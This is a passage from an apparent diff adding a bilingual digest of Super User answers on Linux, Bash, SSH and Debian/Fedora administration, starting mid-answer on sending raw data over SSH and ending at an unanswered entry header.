wouldn't understand any of it!) But it still understands Telnet negotiation, and you're mostly just lucky that none of the other users on IRC have thought to send you /msg's containing the special Telnet protocol control codes¹. The protocol handling is still there; you're not really transferring raw data. (You'd need a real raw TCP client like nc or socat for that purpose.) ¹ (Not to be confused with ANSI control codes, which are a different matter and are meant for your terminal.) With SSH – or really any other protocol – that doesn't work. For one, SSH negotiation has to happen when an SSH client talks to an SSH server. Simply letting it not happen on non-standard port numbers would rather defeat the point of an SSH client, which is to ensure an encrypted connection (and to authenticate the server, and also to provide the various "side-band" services). Second, the SSH protocol is structured completely differently, instead of free-flow data with in-line signalling it uses the complete opposite structure of messages or packets or frames, where each unit of data comes with a certain header. So even if the full SSH handshake were skipped somehow, just sending the keypress a would still transmit more data (a whole SSH protocol packet with its framing). If that weren't the case, then the SSH client wouldn't be an SSH client anymore. So really it's not that SSH is confined to a shell, but more that an SSH client can only talk to an SSH server. This rules out situation #1 (but doesn't rule out situation #2 as that still happens inside of the proper protocol). On SSH, the closest thing to this I know of is cat "text" | ssh user@host "cat > remote" . However, this seems really hacky and is still using SSH as a shell. Is it possible to use the SSH protocol to send bytes directly? Yes and no. First, in your IRC example, the Telnet client isn't really talking the Telnet protocol. The protocols overlap just enough, but you can't actually speak the full Telnet protocol to an IRC server. In the same way, you cannot speak the SSH protocol to an IRC server – if your "SSH client" talks IRC, then it no longer talks SSH by definition. Whereas in your Star Wars example, you're no longer "sending bytes directly"; you could be interacting with a proper Telnet server without realizing it. Unlike IRC, there is nothing special about Blinkenlights that bypasses the Telnet protocol – it can very well be a regular Telnet server that simply runs a different backend program than a shell – and even a standard "shell-oriented" SSH server like OpenSSH could be configured to do that with an SSH client. A whole custom SSH server could also be easily written that doesn't involve OpenSSH or running a separate "player" program but directly generates the output data. Golang is a popular choice since there's a Go module that implements the server side of SSH; there was an once slightly popular ssh-chat service, and another example is soft-serve . All of these fit into case #2 above. As a side note: The SSH protocol doesn't immediately dump you into a shell like it might seem – the client and server first negotiate a variety of channels with specific purposes. There is an "interactive shell" channel and a "specific command" channel and an "ssh-agent" channel and a "TCP/IP forward" channel and so on, each of which your client has to explicitly request. That is to say, in SSH the client doesn't just send data to the server, it first has to specify where to send that data – be it a command or a host:port or something else. (Unlike TLS, which is just a plain data pipe.) But it also means that even when it comes to ordinary "shell oriented" SSH servers like OpenSSH, running a single command is a different situation than attaching to an interactive shell, as the provided command isn't just "fake keyboard input" but causes the whole shell to be run differently, with the command fully separate from input. (Specifically, OpenSSH does bash -c "the command" .) Therefore your ssh "cat > foo" example is somewhat less hacky than using telnet , since it actually guarantees a clean 8-bit channel when invoked like this (with the SSH client automatically disabling tty allocation), without any possibility of certain bytes being misinterpreted as control codes. That's not the case when using the 'telnet' program, where e.g. byte 0xFF would look like the beginning of Telnet handshake. (Guarantees at SSH protocol level, that is. The remote shell is another matter. The shell doesn't interpret input in this situation either – it only interprets the provided command string – but… the shell can still print unnecessary stuff if improperly configured, as sometimes happens with .bashrc on some distributions.) Indeed your example is basically what most programs use to transfer raw binary data over SSH. They just don't use > shell redirection to do that, but instead run a custom "server" command to talk to – for example, pushing a Git repository over SSH runs git-receive-pack in exactly this way, and transferring files using SFTP runs sftp-server , and rsyncing files runs rsync --server , and so on. SFTP is a standard part of SSH, so that's what you'd normally use to send files. (I have a script called 'sftpipe' that takes data from stdin and writes it to a file over SSH using SFTP.) But you could just as well do tar -c | ssh somehost "tar -x" , and at SSH protocol level this provides a 8-bit-clean "pipe" to the remote command. Yes, with OpenSSH you're not avoiding a shell on the server side (not even with SFTP!) but again, the shell does not actually deal with your input/output in the first place – it doesn't sit as a "proxy" in front of the program's stdin/stdout – so that is generally not an issue.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1934196/how-can-i-send-data-not-commands-over-ssh
+
+---
+
+#### 3040. Why does it seem that IPv6 not working on my Fedora 43 setup?
+
+**问题描述 / Problem Description**:
+Tags: networking, fedora, ping, ipv6 | Score: 3 | Views: 187 | Answers: 2 | Created: 2026-01-16
+
+**解决方案 / Solution**:
+I restarted my router and it worked suddenly. But only my faulty device was affected.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1933790/why-does-it-seem-that-ipv6-not-working-on-my-fedora-43-setup
+
+---
+
+#### 3041. How can get SFTP commands return codes?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, sftp | Score: 3 | Views: 522 | Answers: 1 | Created: 2026-01-07
+
+**解决方案 / Solution**:
+The SFTP returns error code on command error in a batch mode only. So normally with -b batchfile switch. If you want to keep using input redirection for the commands, use -b - : https://man.openbsd.org/sftp#b
+
+**参考链接 / References**:
+- https://superuser.com/questions/1933393/how-can-get-sftp-commands-return-codes
+
+---
+
+#### 3042. Trying to better understand how Bash select statement variables work
+
+**问题描述 / Problem Description**:
+Tags: bash, environment-variables | Score: 3 | Views: 172 | Answers: 1 | Created: 2025-12-19
+
+**解决方案 / Solution**:
+On a Ubuntu 24.04.3 LTS system with GNU bash, version 5.2.21(1)-release man bash has the following in the list of Shell Variables : COLUMNS Used by the select compound command to determine the terminal width when printing selection lists. Automatically set if the checkwinsize option is enabled or in an interactive shell upon receipt of a SIGWINCH. Note the mention that COLUMNS is set automatically if the checkwinsize option is enabled. On my system printing all options, as suggested by How can I list Bash's options for the current shell? , shows the checkwinsize option is set: $ echo $-; shopt -p ; shopt -po <snip> shopt -s checkwinsize Therefore, suggest you try unsetting the checkwinsize option in your script using: $ shopt -u checkwinsize
+
+**参考链接 / References**:
+- https://superuser.com/questions/1932658/trying-to-better-understand-how-bash-select-statement-variables-work
+
+---
+
+#### 3043. sed command gives errror that I do not understand
+
+**问题描述 / Problem Description**:
+Tags: bash, sed | Score: 3 | Views: 148 | Answers: 1 | Created: 2025-12-10
+
+**解决方案 / Solution**:
+I assume you want to collect executed commands and where they were run in ~/.cmd_history . Note this will look confusing for multi-line commands. Note this about PROMPT_COMMAND in the bash(1) manpage: PROMPT_COMMAND If this variable is set, and is an array, the value of each set element is executed as a command prior to issuing each primary prompt. If this is set but not an array variable, its value is used as a command to execute instead. So there is no need for command expansion ( $() ). For example, this works here: PROMPT_COMMAND="{ pwd | tr '\n' ':'; history 1 | sed -E 's/^ *[0-9]+ *//'; } >> ~/.cmd_history"
+
+**参考链接 / References**:
+- https://superuser.com/questions/1931299/sed-command-gives-errror-that-i-do-not-understand
+
+---
+
+#### 3044. ssh and find interact weirdly when no files match the find qualifiers
+
+**问题描述 / Problem Description**:
+Tags: command-line, bash, ssh, find, command-line-arguments | Score: 3 | Views: 702 | Answers: 1 | Created: 2025-11-06
+
+**解决方案 / Solution**:
+This is all about quoting (or the lack of it). Consider locally, find /var/log/postgresql -name '*log' -type f -size +4096c the quotes around *log are handled by the shell and tell it that the content is to be treated literally. So the shell passes these four characters to find . Specifically, it does not pass the quotes themselves as it's already used those to interpret the string as a literal. Now consider your remote invocation, ssh FISPCDSPGS401B find /var/log/postgresql -name '*log' -type f -size +4096c The local shell handles the quotes round *log exactly as before and this time passes the four character value to ssh . This in turn passes its resulting command line to the remote server FISPCDSPGS401B : find /var/log/postgresql -name *log -type f -size +4096c Notice that there are no quotes around *log because the local shell has already processed them. The *log either matches zero, one, or more files in the remote user's home directory. If it's zero you win and the two words -name *log are passed literally to find . If it's one match, for example to a file called analog , you get -name analog passed to find . If you get multiple matches find will crash and burn, trying to parse something like -name analog anotherlog nomoreplease.log -type f … . This last case is the cause of the error you're showing in your question. The solution is to provide outer quotes to the original ssh command so that the inner quotes around *log are not processed by the local shell but instead are included in the string passed to the remote host: ssh FISPCDSPGS401B "find /var/log/postgresql -name '*log' -type f -size +4096c"
+
+**参考链接 / References**:
+- https://superuser.com/questions/1929828/ssh-and-find-interact-weirdly-when-no-files-match-the-find-qualifiers
+
+---
+
+#### 3045. How to keep the tail of a logfile, and not the near-infinite debug spew before it?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, logging, debug, tail | Score: 3 | Views: 127 | Answers: 2 | Created: 2025-10-09
+
+**解决方案 / Solution**:
+curtail implements this by using filesystem features to truncate files from the beginning. It only works with certain filesystems. rotatelogs (comes as part of the Apache httpd webserver) implements something similar by flipping between 2 log files. Pipe your messages to rotatelogs -n2 foolog 4k (choose number and size as needed). Afterwards, cat together the files in last-modified order to get your "latest lines". This and this threads have suggestions for circular logging tools. I could not find a direct port of pfSense/FreeBSD's clog that would more directly use a ring buffer format (Google seems to insist that "linux ring buffer tool" means dmesg), but the alternatives will probably do the job. As a side note, your shell redirections seem to be out of order. 2>&1 doesn't permanently link 2 and 1 – it only redirects 2 to where 1 was pointing at that moment, and 2 is unaffected by any 1> redirections that happen later. Because of that, 2>&1 should generally be used after >logfile , not before, if the goal is to redirect both 1+2 into the same file. ( &>logfile is the Bash shortcut for the combined redirection.) If there is some specific reason you want it the current way, then the script should have a comment explaining why it's deliberately "backwards" from the typical usage.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1926386/how-to-keep-the-tail-of-a-logfile-and-not-the-near-infinite-debug-spew-before-i
+
+---
+
+#### 3046. Why is it when I’m trying to install ZFS on Debian Trixie, I get a message that the release can’t be found?
+
+**问题描述 / Problem Description**:
+Tags: debian, zfs, zfsonlinux | Score: 3 | Views: 2264 | Answers: 1 | Created: 2025-08-14
+
+**解决方案 / Solution**:
+So it turns out that I needed to add the 'contrib' repository component/section to my /etc/apt/sources.list so added it using the one-liner: sudo sed -i -E 's/^(deb .* main)(?!.*\bcontrib\b)/\1 contrib/' /etc/apt/sources.list And then ran sudo apt update and then sudo apt install zfsutils-linux . Then I knew it worked because sudo which zpool returned /usr/sbin/zpool Turns out I missed the second line of the documentation It is necessary to add the contrib section to your apt sources configuration to be able to get the packages
+
+**参考链接 / References**:
+- https://superuser.com/questions/1918215/why-is-it-when-i-m-trying-to-install-zfs-on-debian-trixie-i-get-a-message-that
+
+---
+
+#### 3047. Where are the sources of GNU GMP (a.k.a. libgmp) in Debian?
+
+**问题描述 / Problem Description**:
+Tags: debian, packages | Score: 3 | Views: 403 | Answers: 1 | Created: 2025-07-18
+
+**解决方案 / Solution**:
+So which package has the sources of libgmp in Debian None. Sources aren't distributed as packages – they're literally the sources from which packages are built from. So the source code of the library is contained within the source code of the Debian package. While Debian has the term "source package", these are not actually packages in the apt/dpkg sense of the word. They are not installable nor seen by apt/synaptic in general (although the apt repository metadata has pointers to the correct location). and how do I get it? Enable deb-src repository lines in your /etc/apt/sources.list (basically copy every Debian 'deb' line to a 'deb-src' one), then use: apt update apt source libgmp The downloaded tree will contain a debian/ directory with build rules, so it will be suitable for building a full package using: # apt install build-essential # apt build-dep libgmp dpkg-buildpackage -b -us -uc Debian packaging style is slightly unusual in that it puts build rules within the source tree; other distributions typically do the opposite and start with the spec file which then downloads sources straight from upstream. So you'll have debian/rules which actually calls the 'configure' command, debian/patches/ which contains Debian-specific changes (often a lot), and such. You can also do this manually, by going to https://packages.debian.org/libgmp and clicking "Source package". (It's not an apt/dpkg package, but it's still a standardized Debian "unit of measurement".) From that page, either there will be a link to a Git repository on salsa.debian.org, or several links to .tar.gz (pristine upstream source) + .diff (patch to add Debian's build rules) + .dsc files.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1911347/where-are-the-sources-of-gnu-gmp-a-k-a-libgmp-in-debian
+
+---
+
+#### 3048. Why does Linux (Debian 12) file system creation fail at installation from a live USB?
+
+**问题描述 / Problem Description**:
+Tags: linux, hard-drive, debian, formatting | Score: 3 | Views: 607 | Answers: 1 | Created: 2025-07-12
+
+**解决方案 / Solution**:
+I took another approach and connected the HDD to my main laptop to try to partition and format it there. Immediately after connecting I got a system notification like " device /dev/sdc is likely to fail soon ". I considered the suggestion made by Jorge Luiz in a comment to the question: sudo smartctl -a /dev/sdc ... and got right at the top: ... === START OF READ SMART DATA SECTION === SMART overall-health self-assessment test result: FAILED! Drive failure expected in less than 24 hours. SAVE ALL DATA. ... Seems that the HDD has reached its end of life, too.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1910293/why-does-linux-debian-12-file-system-creation-fail-at-installation-from-a-live
+
+---
+
+#### 3049. Install postgresql-18 beta from apt repo on debian
+
+**问题描述 / Problem Description**:
+Tags: debian, installation, postgresql, apt | Score: 3 | Views: 772 | Answers: 2 | Created: 2025-07-06
+
+**解决方案 / Solution**:
+You need to configure the Experimental Repository Debian . Add to the file /etc/apt/sources.list the following line: deb https://deb.debian.org/debian experimental main Run the following command lines: apt update apt -t experimental install postgresql-18 That's it. Now you've the beta version installed. Futher Information postgresql-18 experimental package DebianExperimental
+
+**参考链接 / References**:
+- https://superuser.com/questions/1909102/install-postgresql-18-beta-from-apt-repo-on-debian
+
+---
+
+#### 3050. Postfix service not producing logs in Ubuntu 24.04 Distrobox on Bazzite (Fedora Atomic)
+
+**问题描述 / Problem Description**:
+Tags: email, fedora, postfix | Score: 3 | Views: 295 | Answers: 1 | Created: 2025-06-30
+
+**解决方案 / Solution**:
+There's no way to tell what is exactly going on with your problem given only this information. I'm not familiar with Kubuntu , Bazzite , restic , and have never used proton bridge . However, I have done a decent amount of work with postfix If you want to start the debugging process, I would start by checking the postfix conf files and the paths in there. If you're running postfix with something like systemctl and have something like journalctl integrated, I would check the service logs from the service runner itself. Most likely if you're not seeing "email receipts" you'd see an error higher up in the service stack If you've used postfix before, I assume you're aware of the network/port and file/folder permissions postfix needs, and have made sure other services (firewall) isn't interfering. Additionally, you may need to configure things such as allowed and sender domains to make sure the service can actually send an email from an account: http://www.postfix.org/BASIC_CONFIGURATION_README.html
+
+**参考链接 / References**:
+- https://superuser.com/questions/1907715/postfix-service-not-producing-logs-in-ubuntu-24-04-distrobox-on-bazzite-fedora
+
+---
+
+#### 3051. Laptop sometimes won't turn on, sometimes shuts off during use
+
+**问题描述 / Problem Description**:
+Tags: debian, thinkpad | Score: 3 | Views: 141 | Answers: 1 | Created: 2025-06-14
+
+**解决方案 / Solution**:
+It looks like it's a hardware problem and not the OS. Can you try running the laptop without the docking station? And once, I would remove the battery and run the laptop without it. To rule out that either of the two parts is the issue. Because then it’s probably an issue with the laptop, something isn’t right. With used things, you always have to be careful!
+
+**参考链接 / References**:
+- https://superuser.com/questions/1905179/laptop-sometimes-wont-turn-on-sometimes-shuts-off-during-use
+
+---
+
+#### 3052. Fedora Core 39 Disable zram0
+
+**问题描述 / Problem Description**:
+Tags: fedora, swap, zram | Score: 3 | Views: 4781 | Answers: 1 | Created: 2024-02-09
+
+**解决方案 / Solution**:
+As recommended by Fedora Project[1]: touch /etc/systemd/zram-generator.conf However If there is a configuration existing using copy "null" and it will zero out the file as well as create it if it does not exist. The chattr +i will prevent upgrades from re-enabling it. cp /dev/null /etc/systemd/zram-generator.conf chattr +i /etc/systemd/zram-generator.conf 1.) https://fedoraproject.org/wiki/Changes/SwapOnZRAM#How_can_it_be_disabled
+
+**参考链接 / References**:
+- https://superuser.com/questions/1829485/fedora-core-39-disable-zram0
+
+---
+
+#### 3053. Am I able to hide the GNOME title bar for applications?
+
+**问题描述 / Problem Description**:
+Tags: linux, centos, fedora, gnome | Score: 3 | Views: 19743 | Answers: 1 | Created: 2023-01-25
+
+**解决方案 / Solution**:
+Plainly, applications can be run full screen, sans title bar, as do some video and image apps, so it is possible if the app implements it. See the Unite GNOME shell extension which, among other things, Removes titlebars on maximized windows. Hides window controls on maximized windows with headerbars. Download from GitHub . Please let us know if this works for you.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1764903/am-i-able-to-hide-the-gnome-title-bar-for-applications
+
+---
+
+#### 3054. Send raw printfile from windows to CUPS print server
+
+**问题描述 / Problem Description**:
+Tags: debian, cups | Score: 2 | Views: 342 | Answers: 1 | Created: 2026-04-27
+
+**解决方案 / Solution**:
+The reported error, 0x0000052e, is "Logon Failure: unknown user name or bad password". An oddity of the Windows credential prompt is that if you do not specify a computer/domain name as part of the user name, it will prepend the current domain/computer - and I think it defaults to the computer, not the domain. Thus, if my computer is named Workbox on the domain contoso.com , entering user in the user name field of the Windows credential prompt will assume that I mean Workbox\user , not contoso.com\user . Try entering the credential as contoso.com\contosouser with the correct domain password. Alternatively, if the cups server has its own logon names, try cupsserver\cupsuser . Edited: I had originally included \\ at the beginning of the suggested user names; this is incorrect, as pointed out in the comments.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1937097/send-raw-printfile-from-windows-to-cups-print-server
+
+---
+
+#### 3055. Limit overall memory usage for all logged in users via pam_cgfs.so and cgroups-v2
+
+**问题描述 / Problem Description**:
+Tags: linux, memory, debian, pam, cgroup | Score: 2 | Views: 199 | Answers: 1 | Created: 2026-04-26
+
+**解决方案 / Solution**:
+Debian 13 uses systemd as the init system and service manager. Systemd itself manages the entire cgroupsv2 hierarchy and already puts each user in a separate per-uid/per-session cgroup through pam_systemd . (See systemd-cgls for the hierarchy it creates, and loginctl for the high-level session management.) Because of that – as noted in the same manual page you linked – pam_cgfs doesn't create new hierarchies when it detects that systemd is in use: Systems with a systemd init system are treated specifically, both with respect to cgroupfs v1 and cgroupfs v2. For both, cgroupfs v1 and cgroupfs v2, the module checks whether systemd already placed the user in a cgroup it created user.slice/user-$uid/session-n.scope by checking whether $uid == login uid. If so, the login user chown the session-n.scope, else a cgroup is created as outlined above ( user/$user/n ) and chown it to login uid. If the init system has already placed the login user inside a session specific group, the pam_cgfs.so module is smart enough to detect it and re-use the cgroup. Since you already have a common "users" cgroup created by systemd, pam_cgfs is redundant here; you can directly edit the systemd configuration for the cgroup. The common parent for all user sessions (including also their per-user systemd instances) is /user.slice : $ cat /proc/self/cgroup 0::/user.slice/user-2001.slice/session-1772.scope which you can configure using systemctl edit user.slice , systemctl set-property , or the manual way of /etc/systemd/system/user.slice.d/whatever.conf . Available parameters are documented in systemd.slice(5) and systemd.resource-control(5) . For example, you could add: [Slice] MemoryMax=115G Edits to cgroup-based parameters are applied immediately. The current status of the memory limit will be shown in systemctl status user.slice . Parameters can also be mass-applied to the per-user slices by editing user-.slice (with a trailing dash); this will act as a "template" for every user-UID.slice (e.g. if you wanted to limit each individual user to 2G max). Of course, editing user-2001.slice will apply parameters to that UID only. You can also do the opposite and provide services with a minimum reservation by adding MemoryMin= to system.slice . (See systemd-cgls for the hierarchy.)
+
+**参考链接 / References**:
+- https://superuser.com/questions/1937071/limit-overall-memory-usage-for-all-logged-in-users-via-pam-cgfs-so-and-cgroups-v
+
+---
+
+#### 3056. How can you configure a system-wide minimum version of TLS and cipher libraries on Debian systems, such as LMDE?
+
+**问题描述 / Problem Description**:
+Tags: linux, debian, tls | Score: 2 | Views: 183 | Answers: 2 | Created: 2026-04-06
+
+**解决方案 / Solution**:
+Where can you configure a similar minimum TLS setting for all programs on the system? Probably nowhere. There are multiple TLS libraries used by programs (OpenSSL, GnuTLS, NSS, Botan, Golang's built-in one, Java's built-in one, whatever Rust comes up with...), and they don't really have a single common place for configuration. Only Fedora/RHEL packagers put in some work to patch all of them to follow a centrally configurable policy, but other distributions don't have an equivalent. (And that's not even counting the software which comes via Flatpak or AppImage or otherwise beyond the distro's control...) At best you might be able to edit /etc/ssl/openssl.cfg for the ones which use OpenSSL (but, for example, none of the major web browsers do so it'll only affect minor apps and command-line tools). (You do get a similar situation on Windows too. There's the Windows-provided "SChannel" TLS interface of course, but not even Edge uses that anymore.)
+
+**参考链接 / References**:
+- https://superuser.com/questions/1936487/how-can-you-configure-a-system-wide-minimum-version-of-tls-and-cipher-libraries
+
+---
+
+#### 3057. How to use a “case” statement inside a select statement in Bash script?
+
+**问题描述 / Problem Description**:
+Tags: bash | Score: 2 | Views: 179 | Answers: 1 | Created: 2025-12-26
+
+**解决方案 / Solution**:
+I'm fairly certain the *) option in the case statement never executes It does. Run the script and enter 4 four times. keep a count of empty responses There's nothing like an empty response, regardless of case being involved or not. From help select : If the line is empty, WORDS and the prompt are redisplayed. select doesn't proceed if the reply is empty.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1932908/how-to-use-a-case-statement-inside-a-select-statement-in-bash-script
+
+---
+
+#### 3058. How to capture the “enter” key as input in a Bash script?
+
+**问题描述 / Problem Description**:
+Tags: bash | Score: 2 | Views: 251 | Answers: 1 | Created: 2025-12-25
+
+**解决方案 / Solution**:
+tl;dr With select : no (unless in some very cumbersome way that involves more than Bash). Analysis This is what help select prints in Bash 5.2.37 [formatting and emphasis mine]: select : select NAME [in WORDS ... ;] do COMMANDS; done Select words from a list and execute commands. The WORDS are expanded, generating a list of words. The set of expanded words is printed on the standard error, each preceded by a number. […] The PS3 prompt is then displayed and a line read from the standard input. If the line consists of the number corresponding to one of the displayed words, then NAME is set to that word. If the line is empty, WORDS and the prompt are redisplayed. If EOF is read, the command completes. Any other value read causes NAME to be set to null. […] COMMANDS are executed after each selection until a break command is executed. […] select expects a number. What it expects does not depend on any word you pass in WORDS . Sole Enter sends an empty line. Bash states explicitly: if the line is empty, WORDS and the prompt are redisplayed. The only way to select the 2nd (in general: Nth) line by pressing just Enter is to make Enter result in 2\n for select to read (instead of sole \n ). If Bash used Readline when handling select (which is a keyword) then this could be done by configuring Readline, I think; but it does not use Readline, it uses the line discipline. The line discipline can be configured to convert \r (generated by Enter ) into \n , this is what it actually does when you run select ; but there is no way to make the line discipline convert \r to 2\n . Under tmux there is a way to make Enter result in the sequence normally sent by 2 Enter : tmux bind-key -T root Enter 'send 2; send Enter' If your script (running under tmux) called this before select (and called tmux unbind-key -T root Enter later to revert), then you would kinda achieved what you want. Still this would affect Enter for other tmux panes and tmux windows for you. I think it is possible to restrict this for a specific pane, cumbersome though, so I won't even try. Similarly you may be able to make Enter result in the sequence normally sent by 2 Enter by configuring the terminal emulator that provides a tty for the script. Doing this from within the script may or may not be easy (if possible at all), depending on which terminal emulator you use. When using a virtual console, you probably could achieve what you want by using loadkeys and a custom file. This has its own problems . There are probably other ways: rlwrap , expect , … One way or another: cumbersome, requiring and affecting more than Bash that runs select . Alternative If you really want sole Enter to trigger a specific action, rewrite your script using read (in a loop if appropriate) instead of select . An empty line will not be special, you will be able to detect it and do whatever you want in response.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1932870/how-to-capture-the-enter-key-as-input-in-a-bash-script
+
+---
+
+#### 3059. How to stop Bluetooth from waking my monitors from sleep every 15 minutes with Debian/KDE?
+
+**问题描述 / Problem Description**:
+Tags: debian, bluetooth, kde, wayland, sddm | Score: 2 | Views: 130 | Answers: 1 | Created: 2025-11-30
+
+**解决方案 / Solution**:
+It wasn't Bluetooth, it was my Nvidia GPU failing to suspend. System is now suspending normally after enabling the following services: sudo systemctl enable nvidia-suspend.service sudo systemctl enable nvidia-hibernate.service sudo systemctl enable nvidia-resume.service Solution found in: https://bbs.archlinux.org/viewtopic.php?id=288181
+
+**参考链接 / References**:
+- https://superuser.com/questions/1930837/how-to-stop-bluetooth-from-waking-my-monitors-from-sleep-every-15-minutes-with-d
+
+---
+
+#### 3060. How to change a string on the line for a specific parameter (we don’t know the string value) in a Linux Bash script?
+
+**问题描述 / Problem Description**:
+Tags: bash, shell-script, sed, awk, string | Score: 2 | Views: 267 | Answers: 2 | Created: 2025-10-15
+
+**解决方案 / Solution**:
+For $ cat toto1.sh command -z $ZONE -a $FQDN -u serviceaccount -p p!ass@w0rq -c domainOrganizationUnit command -u serviceaccount -p p!ass@w0rq -z $ZONE -a $FQDN -c domainOrganizationUnit This $ sed 's/ -p [^ ]*/ -p p1wrd!cmd/' toto1.sh command -z $ZONE -a $FQDN -u serviceaccount -p p1wrd!cmd -c domainOrganizationUnit command -u serviceaccount -p p1wrd!cmd -z $ZONE -a $FQDN -c domainOrganizationUnit or to only change passwords for a specific command "command" $ sed 's/^\(command.*\) -p [^ ]*/\1 -p p1wrd!cmd/' toto1.sh command -z $ZONE -a $FQDN -u serviceaccount -p p1wrd!cmd -c domainOrganizationUnit command -u serviceaccount -p p1wrd!cmd -z $ZONE -a $FQDN -c domainOrganizationUnit This assumes old passwords never contain spaces and the commands are never continued across multiple lines etc. I would test carefully on a range of inputs and maybe insert code into toto1.sh that checks for and guards against syntax errors by checking return codes from commands. The above is a literal-minded answer but I would advocate using the far less risky approach outlined in the comment by Kamil Maciorowski . If toto1.sh is always used interactively, you could also consider having toto1.sh prompt for the password every time, using a method that doesn't display the password as it is typed.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1926722/how-to-change-a-string-on-the-line-for-a-specific-parameter-we-don-t-know-the-s
+
+---
+
+#### 3061. Why does `bind -x` with Ctrl+O stop working after dropping to shell from `vifm` in Kitty terminal?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, shell, vifm | Score: 2 | Views: 107 | Answers: 1 | Created: 2025-10-13
+
+**解决方案 / Solution**:
+You run bind -x '"\C-o":vifm' in Bash. Then you hit Ctrl + o and Bash runs vifm ; the shell is a parent, vifm is a child. Then you invoke :shell and vifm spawns its own child: a new Bash. Finally you hit Ctrl + o again. The child of vifm (the shell which received your futile Ctrl + o ) is not the parent of vifm (the shell which has been configured with bind … ). If you made it so each new interactive Bash runs bind -x '"\C-o":vifm' for itself automatically then Ctrl + o would work in the child shell. But it would run yet another vifm in which you might be tempted to invoke :shell again an spawn yet another shell. Stacking shells and vifm s is not elegant. From a child shell you can go back to the parent (i.e. old) vifm simply by exiting the shell ( exit Enter or Ctrl + d when command line is empty).
+
+**参考链接 / References**:
+- https://superuser.com/questions/1926616/why-does-bind-x-with-ctrlo-stop-working-after-dropping-to-shell-from-vifm
+
+---
+
+#### 3062. How to download highest quality (video and audio), and embed thumbnail with yt-dlp?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, ffmpeg, video, yt-dlp | Score: 2 | Views: 2554 | Answers: 2 | Created: 2025-09-16
+
+**解决方案 / Solution**:
+You might be looking for --merge-output-format or -t , both of which choose the container that the best video/audio streams get combined into with ffmpeg, without reencoding. MKV would be a good choice for the container that easily supports thumbnails. Which you then add with --embed-thumbnail as normally. So the command could be something like this: yt-dlp -t mkv --embed-thumbnail -o output.mkv https://youtube.com/watch?v=YXRFgYWhRLw You don't need to specify best video/audio format as that's the default.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1924786/how-to-download-highest-quality-video-and-audio-and-embed-thumbnail-with-yt-d
+
+---
+
+#### 3063. Use find, exec, basename and xargs to save file selection to different folder
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, find | Score: 2 | Views: 113 | Answers: 2 | Created: 2025-09-08
+
+**解决方案 / Solution**:
+Are you open to an alternative approach? mkdir Photoshoot-{all,selection,raw} touch Photoshoot-all/{1..10}.{JPG,CR3} touch Photoshoot-selection/{1,3,7}.JPG Which gives me: ./Photoshoot-raw ./Photoshoot-all ./Photoshoot-all/3.JPG ./Photoshoot-all/8.JPG ./Photoshoot-all/2.CR3 ./Photoshoot-all/10.JPG ./Photoshoot-all/5.CR3 ./Photoshoot-all/9.JPG ./Photoshoot-all/10.CR3 ./Photoshoot-all/7.JPG ./Photoshoot-all/1.CR3 ./Photoshoot-all/6.CR3 ./Photoshoot-all/7.CR3 ./Photoshoot-all/1.JPG ./Photoshoot-all/9.CR3 ./Photoshoot-all/5.JPG ./Photoshoot-all/2.JPG ./Photoshoot-all/8.CR3 ./Photoshoot-all/4.JPG ./Photoshoot-all/3.CR3 ./Photoshoot-all/4.CR3 ./Photoshoot-all/6.JPG ./Photoshoot-selection ./Photoshoot-selection/3.JPG ./Photoshoot-selection/7.JPG ./Photoshoot-selection/1.JPG And with that we can: find Photoshoot-selection/ -type f -printf "%f\n" | sed 's/.JPG//' | xargs -I{} cp Photoshoot-all/"{}".CR3 Photoshoot-raw/. find . ./Photoshoot-raw ./Photoshoot-raw/1.CR3 ./Photoshoot-raw/7.CR3 ./Photoshoot-raw/3.CR3 ./Photoshoot-all ./Photoshoot-all/3.JPG ./Photoshoot-all/8.JPG ./Photoshoot-all/2.CR3 ./Photoshoot-all/10.JPG ./Photoshoot-all/5.CR3 ./Photoshoot-all/9.JPG ./Photoshoot-all/10.CR3 ./Photoshoot-all/7.JPG ./Photoshoot-all/1.CR3 ./Photoshoot-all/6.CR3 ./Photoshoot-all/7.CR3 ./Photoshoot-all/1.JPG ./Photoshoot-all/9.CR3 ./Photoshoot-all/5.JPG ./Photoshoot-all/2.JPG ./Photoshoot-all/8.CR3 ./Photoshoot-all/4.JPG ./Photoshoot-all/3.CR3 ./Photoshoot-all/4.CR3 ./Photoshoot-all/6.JPG ./Photoshoot-selection ./Photoshoot-selection/3.JPG ./Photoshoot-selection/7.JPG ./Photoshoot-selection/1.JPG
+
+**参考链接 / References**:
+- https://superuser.com/questions/1923955/use-find-exec-basename-and-xargs-to-save-file-selection-to-different-folder
+
+---
+
+#### 3064. How to reuse the content of file descriptor more than once?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, shell, file-descriptors | Score: 2 | Views: 341 | Answers: 2 | Created: 2025-08-28
+
+**解决方案 / Solution**:
+This is not going to work, as the function is being presented with a stream of bytes, not a file. The first wc -l works on this stream, but then there is nothing left for wc -c to process. Essentially, /dev/fd/63 is not something that can be processed more than once and is not seekable but has to be processed sequentially.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1922022/how-to-reuse-the-content-of-file-descriptor-more-than-once
+
+---
+
+#### 3065. Rofi wayland requires support for the layer shell protocol
+
+**问题描述 / Problem Description**:
+Tags: fedora, launcher | Score: 2 | Views: 956 | Answers: 1 | Created: 2025-08-19
+
+**解决方案 / Solution**:
+Currently, rofi does not work in GNOME Wayland, as already reported on the official GitHub page: https://github.com/davatorium/rofi/issues/2214 https://github.com/davatorium/rofi/discussions/2216
+
+**参考链接 / References**:
+- https://superuser.com/questions/1919301/rofi-wayland-requires-support-for-the-layer-shell-protocol
+
+---
+
+#### 3066. How do I remap mouse left click to mouse scroll wheel on Fedora 42
+
+**问题描述 / Problem Description**:
